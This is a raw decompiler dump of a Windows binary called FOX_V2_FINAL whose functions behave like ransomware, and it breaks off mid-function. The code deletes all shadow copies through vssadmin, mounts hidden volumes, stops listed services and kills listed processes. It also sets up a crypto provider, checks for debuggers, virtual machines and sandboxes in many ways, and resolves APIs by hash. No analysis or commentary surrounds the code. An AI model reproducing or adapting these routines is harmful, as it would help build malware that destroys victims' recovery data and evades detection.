/* Hex-Rays decompilation of FOX_V2_FINAL */

// ----- nullsub_3 @ 0x1400064b8 -----
__int64 nullsub_3()
{
  _BYTE retaddr[16]; // [rsp+0h] [rbp+0h]

  return MK_FP(*(_WORD *)retaddr, *(_QWORD *)retaddr)();
}


// ----- nullsub_4 @ 0x140006bf8 -----
void nullsub_4()
{
  ;
}


// ----- nullsub_5 @ 0x140006c28 -----
__int64 nullsub_5()
{
  _BYTE retaddr[16]; // [rsp+0h] [rbp+0h]

  return MK_FP(*(_WORD *)retaddr, *(_QWORD *)retaddr)();
}


// ----- nullsub_6 @ 0x140006c78 -----
void nullsub_6()
{
  ;
}


// ----- sub_14000AC40 @ 0x14000ac40 -----
__int64 sub_14000AC40()
{
  __int64 v0; // rbx
  __int64 v1; // rdi
  const WCHAR *v2; // rsi
  __int64 result; // rax
  WCHAR *v4; // rdi
  __int64 v5; // r14
  HANDLE FirstVolumeW; // rsi
  LPCWSTR lpRootPathName[52]; // [rsp+20h] [rbp-E0h]
  WCHAR szVolumePathNames[272]; // [rsp+1C0h] [rbp+C0h] BYREF
  DWORD cchReturnLength; // [rsp+3F0h] [rbp+2F0h] BYREF

  v0 = 0;
  lpRootPathName[0] = L"Q:\\";
  v1 = 0;
  cchReturnLength = 0;
  lpRootPathName[1] = L"W:\\";
  lpRootPathName[2] = L"E:\\";
  lpRootPathName[3] = L"R:\\";
  lpRootPathName[4] = L"T:\\";
  lpRootPathName[5] = L"Y:\\";
  lpRootPathName[6] = L"U:\\";
  lpRootPathName[7] = L"I:\\";
  lpRootPathName[8] = L"O:\\";
  lpRootPathName[9] = L"P:\\";
  lpRootPathName[10] = L"A:\\";
  lpRootPathName[11] = L"S:\\";
  lpRootPathName[12] = L"D:\\";
  lpRootPathName[13] = L"F:\\";
  lpRootPathName[14] = L"G:\\";
  lpRootPathName[15] = L"H:\\";
  lpRootPathName[16] = L"J:\\";
  lpRootPathName[17] = L"K:\\";
  lpRootPathName[18] = L"L:\\";
  lpRootPathName[19] = L"Z:\\";
  lpRootPathName[20] = L"X:\\";
  lpRootPathName[21] = L"C:\\";
  lpRootPathName[22] = L"V:\\";
  lpRootPathName[23] = L"B:\\";
  lpRootPathName[24] = L"N:\\";
  lpRootPathName[25] = L"M:\\";
  do
  {
    v2 = lpRootPathName[v1];
    if ( GetDriveTypeW(v2) == 1 )
    {
      lpRootPathName[v0 + 26] = v2;
      v0 = (unsigned int)(v0 + 1);
    }
    ++v1;
  }
  while ( v1 != 26 );
  szVolumePathNames[0] = 0;
  result = sub_140016FD0(0x10000);
  v4 = (WCHAR *)result;
  if ( result != 0 )
  {
    v5 = sub_140016FD0(0x10000);
    if ( v5 != 0 )
    {
      FirstVolumeW = FindFirstVolumeW(v4, 0x8000u);
      do
      {
        if ( (_DWORD)v0 == 0 )
          break;
        if ( GetVolumePathNamesForVolumeNameW(v4, szVolumePathNames, 0x78u, &cchReturnLength)
          && lstrlenW(szVolumePathNames) == 3 )
        {
          szVolumePathNames[0] = 0;
        }
        else
        {
          LODWORD(v0) = v0 - 1;
          SetVolumeMountPointW(lpRootPathName[(unsigned int)v0 + 26], v4);
        }
      }
      while ( FindNextVolumeW(FirstVolumeW, v4, 0x8000u) );
      FindVolumeClose(FirstVolumeW);
      sub_140017010(v5);
    }
    return sub_140017010(v4);
  }
  return result;
}


// ----- sub_14000AEB0 @ 0x14000aeb0 -----
unsigned __int64 sub_14000AEB0()
{
  HMODULE ModuleHandleA; // rax
  BOOL (__stdcall *IsWow64Process)(HANDLE, PBOOL); // rbx
  HANDLE CurrentProcess; // rax
  bool v3; // zf
  unsigned int v4; // eax
  HMODULE LibraryA; // rax
  BOOL (__stdcall *Wow64DisableWow64FsRedirection)(PVOID *); // rax
  HMODULE v7; // rax
  BOOL (__stdcall *ProcAddress)(HANDLE, PBOOL); // rbx
  HANDLE v9; // rax
  unsigned __int64 result; // rax
  HMODULE v11; // rax
  unsigned int v12; // [rsp+40h] [rbp+8h] BYREF
  __int64 v13; // [rsp+48h] [rbp+10h] BYREF

  v13 = 0;
  v12 = 0;
  ModuleHandleA = GetModuleHandleA("kernel32.dll");
  IsWow64Process = (BOOL (__stdcall *)(HANDLE, PBOOL))GetProcAddress(ModuleHandleA, "IsWow64Process");
  if ( IsWow64Process == nullptr
    || (CurrentProcess = GetCurrentProcess(),
        v3 = ((unsigned int (__fastcall *)(HANDLE, unsigned int *))IsWow64Process)(CurrentProcess, &v12) == 0,
        v4 = 0,
        !v3) )
  {
    v4 = v12;
  }
  if ( v4 != 0 )
  {
    LibraryA = LoadLibraryA("kernel32.dll");
    Wow64DisableWow64FsRedirection = (BOOL (__stdcall *)(PVOID *))GetProcAddress(
                                                                    LibraryA,
                                                                    "Wow64DisableWow64FsRedirection");
    if ( Wow64DisableWow64FsRedirection != nullptr )
      ((void (__fastcall *)(__int64 *))Wow64DisableWow64FsRedirection)(&v13);
  }
  ShellExecuteW(nullptr, L"open", L"cmd.exe", L"/c vssadmin.exe delete shadows /all /quiet", nullptr, 0);
  v12 = 0;
  v7 = GetModuleHandleA("kernel32.dll");
  ProcAddress = (BOOL (__stdcall *)(HANDLE, PBOOL))GetProcAddress(v7, "IsWow64Process");
  if ( ProcAddress == nullptr
    || (v9 = GetCurrentProcess(),
        v3 = ((unsigned int (__fastcall *)(HANDLE, unsigned int *))ProcAddress)(v9, &v12) == 0,
        result = 0,
        !v3) )
  {
    result = v12;
  }
  if ( (_DWORD)result != 0 )
  {
    v11 = LoadLibraryA("kernel32.dll");
    result = (unsigned __int64)GetProcAddress(v11, "Wow64RevertWow64FsRedirection");
    if ( result != 0 )
      return ((__int64 (__fastcall *)(__int64))result)(v13);
  }
  return result;
}


// ----- sub_14000AFE0 @ 0x14000afe0 -----
int sub_14000AFE0()
{
  DWORD TickCount; // edi
  SC_HANDLE v1; // rax
  SC_HANDLE v2; // r15
  struct _ENUM_SERVICE_STATUSA *v3; // r14
  signed int i; // ebp
  SC_HANDLE v5; // rsi
  struct _ENUM_SERVICE_STATUSA *v6; // rax
  SC_HANDLE v7; // rax
  SC_HANDLE v8; // rbx
  struct _SERVICE_STATUS Buffer; // [rsp+30h] [rbp-88h] BYREF
  struct _SERVICE_STATUS ServiceStatus; // [rsp+58h] [rbp-60h] BYREF
  DWORD cbBufSize; // [rsp+C0h] [rbp+8h] BYREF
  DWORD ServicesReturned; // [rsp+C8h] [rbp+10h] BYREF

  TickCount = GetTickCount();
  v1 = OpenSCManagerA(nullptr, nullptr, 0xF003Fu);
  v2 = v1;
  if ( v1 != nullptr )
  {
    v3 = nullptr;
    for ( i = 0; (unsigned int)i < 0x2C; ++i )
    {
      v5 = OpenServiceA(v2, (LPCSTR)*(&off_140026000 + i), 0x2Cu);
      if ( v5 != nullptr )
      {
        if ( QueryServiceStatusEx(v5, SC_STATUS_PROCESS_INFO, (LPBYTE)&Buffer, 0x24u, &cbBufSize)
          && ((Buffer.dwCurrentState - 1) & 0xFFFFFFFD) != 0 )
        {
          if ( !EnumDependentServicesA(v5, 1u, v3, 0, &cbBufSize, &ServicesReturned) && GetLastError() == 234 )
          {
            v6 = (struct _ENUM_SERVICE_STATUSA *)sub_140016FD0(cbBufSize);
            v3 = v6;
            if ( v6 != nullptr )
            {
              if ( EnumDependentServicesA(v5, 1u, v6, cbBufSize, &cbBufSize, &ServicesReturned) )
              {
                v7 = OpenServiceA(v2, v3[i].lpServiceName, 0x24u);
                v8 = v7;
                if ( v7 != nullptr && ControlService(v7, 1u, &ServiceStatus) )
                {
                  if ( ServiceStatus.dwCurrentState != 1 )
                  {
                    do
                      Sleep(ServiceStatus.dwWaitHint);
                    while ( (!QueryServiceStatusEx(
                                v8,
                                SC_STATUS_PROCESS_INFO,
                                (LPBYTE)&ServiceStatus,
                                0x24u,
                                &cbBufSize)
                          || ServiceStatus.dwCurrentState != 1 && GetTickCount() - TickCount <= 0x7530)
                         && ServiceStatus.dwCurrentState != 1 );
                  }
                  CloseServiceHandle(v8);
                }
              }
              sub_140017010(v3);
            }
          }
          if ( ControlService(v5, 1u, &Buffer) && Buffer.dwCurrentState != 1 )
          {
            do
              Sleep(Buffer.dwWaitHint);
            while ( QueryServiceStatusEx(v5, SC_STATUS_PROCESS_INFO, (LPBYTE)&Buffer, 0x24u, &cbBufSize)
                 && Buffer.dwCurrentState != 1
                 && GetTickCount() - TickCount <= 0x7530
                 && Buffer.dwCurrentState != 1 );
          }
        }
        CloseServiceHandle(v5);
      }
    }
    LODWORD(v1) = CloseServiceHandle(v2);
  }
  return (int)v1;
}


// ----- sub_14000B2C0 @ 0x14000b2c0 -----
BOOL sub_14000B2C0()
{
  HANDLE Toolhelp32Snapshot; // rdi
  int v1; // ebx
  HANDLE v2; // rax
  void *v3; // rbx
  PROCESSENTRY32W pe; // [rsp+20h] [rbp-248h] BYREF

  pe.dwSize = 568;
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(0xFu, 0);
  if ( Process32FirstW(Toolhelp32Snapshot, &pe) )
  {
    do
    {
      v1 = 0;
      while ( lstrcmpW(off_140026160[v1], pe.szExeFile) != 0 )
      {
        if ( (unsigned int)++v1 >= 0x1F )
          goto LABEL_8;
      }
      v2 = OpenProcess(1u, false, pe.th32ProcessID);
      v3 = v2;
      if ( v2 != nullptr )
      {
        TerminateProcess(v2, 9u);
        CloseHandle(v3);
      }
LABEL_8:
      ;
    }
    while ( Process32NextW(Toolhelp32Snapshot, &pe) );
  }
  return CloseHandle(Toolhelp32Snapshot);
}


// ----- sub_14000B3A0 @ 0x14000b3a0 -----
HCRYPTPROV sub_14000B3A0()
{
  HCRYPTPROV phProv; // [rsp+40h] [rbp+8h] BYREF

  phProv = 0;
  if ( CryptAcquireContextW(&phProv, nullptr, nullptr, 0x18u, 0xF0000000)
    || CryptAcquireContextW(&phProv, nullptr, nullptr, 0x18u, 0xF0000008) )
  {
    return phProv;
  }
  else
  {
    return 0;
  }
}


// ----- sub_14000B410 @ 0x14000b410 -----
__int64 sub_14000B410()
{
  HMODULE ModuleHandleA; // rax
  BOOL (__stdcall *IsWow64Process)(HANDLE, PBOOL); // rbx
  HANDLE CurrentProcess; // rax
  __int64 result; // rax
  unsigned int v4; // [rsp+30h] [rbp+8h] BYREF

  v4 = 0;
  ModuleHandleA = GetModuleHandleA("kernel32.dll");
  IsWow64Process = (BOOL (__stdcall *)(HANDLE, PBOOL))GetProcAddress(ModuleHandleA, "IsWow64Process");
  if ( IsWow64Process == nullptr )
    return v4;
  CurrentProcess = GetCurrentProcess();
  result = ((__int64 (__fastcall *)(HANDLE, unsigned int *))IsWow64Process)(CurrentProcess, &v4);
  if ( (_DWORD)result != 0 )
    return v4;
  return result;
}


// ----- sub_14000B490 @ 0x14000b490 -----
_BOOL8 sub_14000B490()
{
  HMODULE ModuleHandleA; // rax
  NTSTATUS (__stdcall *NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG); // rbx
  HANDLE CurrentProcess; // rax
  _BOOL8 result; // rax
  int v4; // [rsp+40h] [rbp+8h] BYREF

  ModuleHandleA = GetModuleHandleA("ntdll.dll");
  result = false;
  if ( ModuleHandleA != nullptr )
  {
    NtQueryInformationProcess = (NTSTATUS (__stdcall *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(ModuleHandleA, "NtQueryInformationProcess");
    if ( NtQueryInformationProcess != nullptr )
    {
      v4 = 0;
      CurrentProcess = GetCurrentProcess();
      if ( ((unsigned int (__fastcall *)(HANDLE, __int64, int *, __int64, _QWORD))NtQueryInformationProcess)(
             CurrentProcess,
             7,
             &v4,
             4,
             0) == 0
        && v4 != 0 )
      {
        return true;
      }
    }
  }
  return result;
}


// ----- sub_14000B510 @ 0x14000b510 -----
_BOOL8 sub_14000B510()
{
  HANDLE CurrentProcess; // rax
  BOOL pbDebuggerPresent; // [rsp+30h] [rbp+8h] BYREF

  pbDebuggerPresent = false;
  CurrentProcess = GetCurrentProcess();
  CheckRemoteDebuggerPresent(CurrentProcess, &pbDebuggerPresent);
  return pbDebuggerPresent;
}


// ----- sub_14000B540 @ 0x14000b540 -----
_BOOL8 sub_14000B540()
{
  HMODULE ModuleHandleA; // rax
  NTSTATUS (__stdcall *NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG); // rbx
  HANDLE CurrentProcess; // rax
  HANDLE v3; // rax
  BOOL pbDebuggerPresent; // [rsp+40h] [rbp+8h] BYREF

  if ( IsDebuggerPresent() )
    return true;
  if ( NtCurrentPeb()->BeingDebugged != 0 )
    return true;
  ModuleHandleA = GetModuleHandleA("ntdll.dll");
  if ( ModuleHandleA != nullptr )
  {
    NtQueryInformationProcess = (NTSTATUS (__stdcall *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(ModuleHandleA, "NtQueryInformationProcess");
    if ( NtQueryInformationProcess != nullptr )
    {
      pbDebuggerPresent = false;
      CurrentProcess = GetCurrentProcess();
      if ( ((unsigned int (__fastcall *)(HANDLE, __int64, BOOL *, __int64, _QWORD))NtQueryInformationProcess)(
             CurrentProcess,
             7,
             &pbDebuggerPresent,
             4,
             0) == 0
        && pbDebuggerPresent )
      {
        return true;
      }
    }
  }
  pbDebuggerPresent = false;
  v3 = GetCurrentProcess();
  CheckRemoteDebuggerPresent(v3, &pbDebuggerPresent);
  return pbDebuggerPresent;
}


// ----- sub_14000B610 @ 0x14000b610 -----
__int64 sub_14000B610()
{
  HKEY hKey; // [rsp+40h] [rbp+8h] BYREF

  if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox Guest Additions", 0, 0x20019u, &hKey) != 0
    && RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\VBoxGuest", 0, 0x20019u, &hKey) != 0 )
  {
    return 0;
  }
  RegCloseKey(hKey);
  return 1;
}


// ----- sub_14000B690 @ 0x14000b690 -----
_BOOL8 sub_14000B690()
{
  BYTE Data[264]; // [rsp+30h] [rbp-108h] BYREF
  DWORD cbData; // [rsp+140h] [rbp+8h] BYREF
  HKEY hKey; // [rsp+148h] [rbp+10h] BYREF

  cbData = 256;
  if ( RegOpenKeyExA(
         HKEY_LOCAL_MACHINE,
         "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
         0,
         0x20019u,
         &hKey) != 0 )
    return false;
  if ( RegQueryValueExA(hKey, "Identifier", nullptr, nullptr, Data, &cbData) != 0 )
  {
    RegCloseKey(hKey);
    return false;
  }
  RegCloseKey(hKey);
  return sub_140019CF0(Data, "QEMU") != 0 || sub_140019CF0(Data, "VBOX") != 0 || sub_140019CF0(Data, "VIRTUAL") != 0;
}


// ----- sub_14000B790 @ 0x14000b790 -----
__int64 sub_14000B790()
{
  BYTE Data[264]; // [rsp+30h] [rbp-108h] BYREF
  HKEY hKey; // [rsp+140h] [rbp+8h] BYREF
  HKEY phkResult; // [rsp+148h] [rbp+10h] BYREF

  if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, 0x20019u, &hKey) == 0
    || RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\vmdebug", 0, 0x20019u, &hKey) == 0
    || RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\vmmouse", 0, 0x20019u, &hKey) == 0
    || RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox Guest Additions", 0, 0x20019u, &hKey) == 0
    || RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\VBoxGuest", 0, 0x20019u, &hKey) == 0 )
  {
    RegCloseKey(hKey);
    return 1;
  }
  LODWORD(hKey) = 256;
  if ( RegOpenKeyExA(
         HKEY_LOCAL_MACHINE,
         "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
         0,
         0x20019u,
         &phkResult) == 0 )
  {
    if ( RegQueryValueExA(phkResult, "Identifier", nullptr, nullptr, Data, (LPDWORD)&hKey) != 0 )
    {
      RegCloseKey(phkResult);
    }
    else
    {
      RegCloseKey(phkResult);
      if ( sub_140019CF0(Data, "QEMU") != 0 || sub_140019CF0(Data, "VBOX") != 0 || sub_140019CF0(Data, "VIRTUAL") != 0 )
        return 1;
    }
  }
  return 0;
}


// ----- sub_14000B980 @ 0x14000b980 -----
_BOOL8 sub_14000B980()
{
  struct _MEMORYSTATUSEX Buffer; // [rsp+20h] [rbp-48h] BYREF

  Buffer.dwLength = 64;
  GlobalMemoryStatusEx(&Buffer);
  return Buffer.ullTotalPhys >> 20 < 0x1000;
}


// ----- sub_14000B9C0 @ 0x14000b9c0 -----
_BOOL8 sub_14000B9C0()
{
  struct _SYSTEM_INFO SystemInfo; // [rsp+20h] [rbp-38h] BYREF

  GetSystemInfo(&SystemInfo);
  return SystemInfo.dwNumberOfProcessors < 2;
}


// ----- sub_14000B9F0 @ 0x14000b9f0 -----
_BOOL8 sub_14000B9F0()
{
  ULARGE_INTEGER TotalNumberOfBytes; // [rsp+30h] [rbp+8h] BYREF
  ULARGE_INTEGER FreeBytesAvailableToCaller; // [rsp+38h] [rbp+10h] BYREF

  return GetDiskFreeSpaceExA("C:\\", &FreeBytesAvailableToCaller, &TotalNumberOfBytes, nullptr)
      && TotalNumberOfBytes.QuadPart >> 30 < 0x3C;
}


// ----- sub_14000BA40 @ 0x14000ba40 -----
_BOOL8 sub_14000BA40()
{
  return GetTickCount() < 0x493E0;
}


// ----- sub_14000BA70 @ 0x14000ba70 -----
__int64 sub_14000BA70()
{
  __int64 v0; // rbx
  _QWORD v2[8]; // [rsp+20h] [rbp-148h]
  CHAR Buffer[264]; // [rsp+60h] [rbp-108h] BYREF
  DWORD v4; // [rsp+170h] [rbp+8h] BYREF

  v4 = 256;
  v2[0] = "sandbox";
  v2[1] = "malware";
  v2[2] = "virus";
  v2[3] = "sample";
  v2[4] = "test";
  v2[5] = "currentuser";
  v2[6] = "user";
  if ( !GetUserNameA(Buffer, &v4) )
    return 0;
  v0 = 0;
  while ( sub_140019CF0(Buffer, v2[v0]) == 0 )
  {
    v0 = (unsigned int)(v0 + 1);
    if ( (unsigned int)v0 >= 7 )
      return 0;
  }
  return 1;
}


// ----- sub_14000BB30 @ 0x14000bb30 -----
__int64 sub_14000BB30()
{
  __int64 v0; // rbx
  _QWORD v2[6]; // [rsp+20h] [rbp-138h]
  CHAR Buffer[264]; // [rsp+50h] [rbp-108h] BYREF
  DWORD v4; // [rsp+160h] [rbp+8h] BYREF

  v4 = 256;
  v2[0] = "SANDBOX";
  v2[1] = "MALWARE";
  v2[2] = "VIRUS";
  v2[3] = "SAMPLE";
  v2[4] = "TEST";
  if ( !GetComputerNameA(Buffer, &v4) )
    return 0;
  v0 = 0;
  while ( sub_140019CF0(Buffer, v2[v0]) == 0 )
  {
    v0 = (unsigned int)(v0 + 1);
    if ( (unsigned int)v0 >= 5 )
      return 0;
  }
  return 1;
}


// ----- sub_14000BBE0 @ 0x14000bbe0 -----
_BOOL8 sub_14000BBE0()
{
  int v0; // ebx
  HANDLE FirstFileA; // rdi
  struct _WIN32_FIND_DATAA FindFileData; // [rsp+20h] [rbp-148h] BYREF

  v0 = 0;
  FirstFileA = FindFirstFileA("C:\\Windows\\System32\\*.dll", &FindFileData);
  if ( FirstFileA != (HANDLE)-1LL )
  {
    do
      ++v0;
    while ( v0 <= 500 && FindNextFileA(FirstFileA, &FindFileData) );
    FindClose(FirstFileA);
  }
  return v0 < 500;
}


// ----- sub_14000BC60 @ 0x14000bc60 -----
_BOOL8 sub_14000BC60()
{
  HANDLE Toolhelp32Snapshot; // rax
  void *v1; // rdi
  int v3; // ebx
  PROCESSENTRY32 pe; // [rsp+20h] [rbp-138h] BYREF

  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  v1 = Toolhelp32Snapshot;
  if ( Toolhelp32Snapshot == (HANDLE)-1LL )
    return false;
  pe.dwSize = 304;
  v3 = 0;
  if ( Process32First(Toolhelp32Snapshot, &pe) )
  {
    do
      ++v3;
    while ( Process32Next(v1, &pe) );
  }
  CloseHandle(v1);
  return v3 < 30;
}


// ----- sub_14000BCF0 @ 0x14000bcf0 -----
__int64 sub_14000BCF0()
{
  DWORD TickCount; // ebx
  unsigned int v1; // edi
  int v2; // esi
  BOOL DiskFreeSpace; // eax
  unsigned int v4; // edi
  int v5; // ecx
  int v6; // ebx
  DWORD v7; // eax
  int v8; // r15d
  int v9; // r14d
  unsigned int v10; // ebx
  int v11; // eax
  unsigned int v12; // esi
  unsigned int v13; // ebx
  unsigned int v14; // r15d
  int v15; // ebx
  HANDLE FirstFileA; // rsi
  unsigned int v17; // r14d
  HANDLE Toolhelp32Snapshot; // rax
  void *v19; // rsi
  BOOL v20; // eax
  int v21; // ebx
  unsigned int v22; // ecx
  struct _MEMORYSTATUSEX Buffer; // [rsp+20h] [rbp-E0h] BYREF
  struct _WIN32_FIND_DATAA v25; // [rsp+60h] [rbp-A0h] BYREF
  ULARGE_INTEGER TotalNumberOfBytes; // [rsp+1D0h] [rbp+D0h] BYREF
  ULARGE_INTEGER FreeBytesAvailableToCaller; // [rsp+1D8h] [rbp+D8h] BYREF

  TickCount = GetTickCount();
  Sleep(0xBB8u);
  Buffer.dwLength = 64;
  v1 = GetTickCount() - TickCount;
  v2 = v1 < 0x9C4 ? 3 : 0;
  GlobalMemoryStatusEx(&Buffer);
  if ( Buffer.ullTotalPhys >> 20 < 0x1000 )
  {
    v2 = 5;
    if ( v1 >= 0x9C4 )
      v2 = 2;
  }
  GetSystemInfo((LPSYSTEM_INFO)&Buffer);
  if ( LODWORD(Buffer.ullAvailPageFile) < 2 )
    v2 += 2;
  DiskFreeSpace = GetDiskFreeSpaceExA("C:\\", &FreeBytesAvailableToCaller, &TotalNumberOfBytes, nullptr);
  v4 = 0;
  v5 = 0;
  if ( DiskFreeSpace )
    LOBYTE(v5) = TotalNumberOfBytes.QuadPart >> 30 < 0x3C;
  v6 = v2 + 2;
  if ( v5 == 0 )
    v6 = v2;
  v7 = GetTickCount();
  v8 = v6 + 2;
  TotalNumberOfBytes.LowPart = 256;
  *(_QWORD *)&Buffer.dwLength = "sandbox";
  if ( v7 >= 0x493E0 )
    v8 = v6;
  Buffer.ullTotalPhys = (DWORDLONG)"malware";
  Buffer.ullAvailPhys = (DWORDLONG)"virus";
  Buffer.ullTotalPageFile = (DWORDLONG)"sample";
  Buffer.ullAvailPageFile = (DWORDLONG)"test";
  Buffer.ullTotalVirtual = (DWORDLONG)"currentuser";
  Buffer.ullAvailVirtual = (DWORDLONG)"user";
  v9 = 1;
  if ( GetUserNameA((LPSTR)&v25, (LPDWORD)&TotalNumberOfBytes) )
  {
    v10 = 0;
    while ( sub_140019CF0(&v25, *((_QWORD *)&Buffer.dwLength + v10)) == 0 )
    {
      if ( ++v10 >= 7 )
        goto LABEL_16;
    }
    v11 = 1;
  }
  else
  {
LABEL_16:
    v11 = 0;
  }
  TotalNumberOfBytes.LowPart = 256;
  *(_QWORD *)&Buffer.dwLength = "SANDBOX";
  v12 = v8 + 3;
  if ( v11 == 0 )
    v12 = v8;
  Buffer.ullTotalPhys = (DWORDLONG)"MALWARE";
  Buffer.ullAvailPhys = (DWORDLONG)"VIRUS";
  Buffer.ullTotalPageFile = (DWORDLONG)"SAMPLE";
  Buffer.ullAvailPageFile = (DWORDLONG)"TEST";
  if ( GetComputerNameA((LPSTR)&v25, (LPDWORD)&TotalNumberOfBytes) )
  {
    v13 = 0;
    while ( sub_140019CF0(&v25, *((_QWORD *)&Buffer.dwLength + v13)) == 0 )
    {
      if ( ++v13 >= 5 )
        goto LABEL_23;
    }
  }
  else
  {
LABEL_23:
    v9 = 0;
  }
  v14 = v12 + 3;
  v15 = 0;
  if ( v9 == 0 )
    v14 = v12;
  FirstFileA = FindFirstFileA("C:\\Windows\\System32\\*.dll", &v25);
  if ( FirstFileA != (HANDLE)-1LL )
  {
    do
      ++v15;
    while ( v15 <= 500 && FindNextFileA(FirstFileA, &v25) );
    FindClose(FirstFileA);
  }
  v17 = v14 + 1;
  if ( v15 >= 500 )
    v17 = v14;
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  v19 = Toolhelp32Snapshot;
  if ( Toolhelp32Snapshot == (HANDLE)-1LL )
  {
    v20 = false;
  }
  else
  {
    v25.dwFileAttributes = 304;
    v21 = 0;
    if ( Process32First(Toolhelp32Snapshot, (LPPROCESSENTRY32)&v25) )
    {
      do
        ++v21;
      while ( Process32Next(v19, (LPPROCESSENTRY32)&v25) );
    }
    CloseHandle(v19);
    v20 = v21 < 30;
  }
  v22 = v17 + 2;
  if ( !v20 )
    v22 = v17;
  LOBYTE(v4) = v22 >= 5;
  return v4;
}


// ----- IsDebuggerPresent @ 0x14000c010 -----
// attributes: thunk
BOOL __stdcall IsDebuggerPresent()
{
  return __imp_IsDebuggerPresent();
}


// ----- sub_14000C020 @ 0x14000c020 -----
__int64 sub_14000C020()
{
  HKEY hKey; // [rsp+40h] [rbp+8h] BYREF

  if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, 0x20019u, &hKey) != 0
    && RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\vmdebug", 0, 0x20019u, &hKey) != 0
    && RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\vmmouse", 0, 0x20019u, &hKey) != 0 )
  {
    return 0;
  }
  RegCloseKey(hKey);
  return 1;
}


// ----- sub_14000C0D0 @ 0x14000c0d0 -----
_BOOL8 sub_14000C0D0()
{
  DWORD TickCount; // ebx

  TickCount = GetTickCount();
  Sleep(0xBB8u);
  return GetTickCount() - TickCount < 0x9C4;
}


// ----- sub_14000C110 @ 0x14000c110 -----
__int64 __fastcall sub_14000C110(__int64 a1, int a2)
{
  __int64 v4; // rax
  __int64 v5; // rcx
  __int64 v6; // rbx
  unsigned int v7; // r11d
  __int64 v8; // rsi
  __int64 v9; // r8
  int v10; // eax
  _BYTE *v11; // rdx
  int v12; // r10d
  int v13; // ecx

  if ( a1 == 0 )
    return 0;
  if ( *(_WORD *)a1 != 23117 )
    return 0;
  v4 = *(int *)(a1 + 60);
  if ( *(_DWORD *)(v4 + a1) != 17744 )
    return 0;
  v5 = *(unsigned int *)(v4 + a1 + 136);
  if ( (_DWORD)v5 == 0 )
    return 0;
  v6 = a1 + v5;
  v7 = *(_DWORD *)(a1 + v5 + 24);
  v8 = a1 + *(unsigned int *)(a1 + v5 + 32);
  v9 = 0;
  if ( v7 == 0 )
    return 0;
  while ( 1 )
  {
    v10 = 5381;
    v11 = (_BYTE *)(a1 + *(unsigned int *)(v8 + 4 * v9));
    v12 = (char)*v11;
    if ( *v11 != 0 )
    {
      do
      {
        v13 = (char)*++v11;
        v10 = v12 + 33 * v10;
        v12 = v13;
      }
      while ( (_BYTE)v13 != 0 );
    }
    if ( v10 == a2 )
      break;
    v9 = (unsigned int)(v9 + 1);
    if ( (unsigned int)v9 >= v7 )
      return 0;
  }
  return a1
       + *(unsigned int *)(a1
                         + *(unsigned int *)(v6 + 28)
                         + 4LL * *(unsigned __int16 *)(a1 + *(unsigned int *)(v6 + 36) + 2 * v9));
}


// ----- sub_14000C1D0 @ 0x14000c1d0 -----
HMODULE sub_14000C1D0()
{
  return GetModuleHandleA("kernel32.dll");
}


// ----- sub_14000C1F0 @ 0x14000c1f0 -----
HMODULE sub_14000C1F0()
{
  return GetModuleHandleA("ntdll.dll");
}


// ----- sub_14000C210 @ 0x14000c210 -----
__int64 sub_14000C210()
{
  return 1;
}


// ----- sub_14000C250 @ 0x14000c250 -----
char __fastcall sub_14000C250(int a1, __int64 a2, _WORD *a3)
{
  unsigned int v3; // r9d
  _WORD *v4; // rax

  v3 = 1;
  if ( a1 <= 1 )
    return 0;
  while ( 1 )
  {
    v4 = *(_WORD **)(a2 + 8LL * v3);
    if ( *v4 == 45 )
      break;
    if ( (int)++v3 >= a1 )
      return 0;
  }
  do
    ++v4;
  while ( *v4 == 45 );
  for ( ; *a3 != 0; ++v4 )
  {
    if ( *a3 != *v4 )
      break;
    ++a3;
  }
  return 1;
}


// ----- sub_14000C2C0 @ 0x14000c2c0 -----
__int64 __fastcall sub_14000C2C0(int a1, __int64 a2, int a3)
{
  int v3; // r10d
  unsigned int v4; // eax

  v3 = 0;
  v4 = 1;
  if ( a1 > 1 )
  {
    do
    {
      if ( **(_WORD **)(a2 + 8LL * v4) == 45 )
      {
        ++v3;
      }
      else if ( v4 - v3 - 1 == a3 )
      {
        return *(_QWORD *)(a2 + 8LL * v4);
      }
      ++v4;
    }
    while ( (int)v4 < a1 );
  }
  return 0;
}


// ----- sub_14000C320 @ 0x14000c320 -----
_WORD *__fastcall sub_14000C320(int a1, __int64 a2, _WORD *a3)
{
  unsigned int v3; // r10d
  _WORD *v6; // r9
  _WORD *v7; // rax
  __int16 v8; // cx
  int v9; // r8d
  int v10; // ecx

  v3 = 1;
  if ( a1 <= 1 )
    return nullptr;
  while ( 1 )
  {
    v6 = a3;
    v7 = *(_WORD **)(a2 + 8LL * v3);
    if ( *v7 == 45 )
    {
      do
      {
        v8 = v7[1];
        ++v7;
      }
      while ( v8 == 45 );
      if ( v8 == 61 )
        goto LABEL_12;
      v9 = 0;
      do
      {
        if ( *v7 == 0 )
          break;
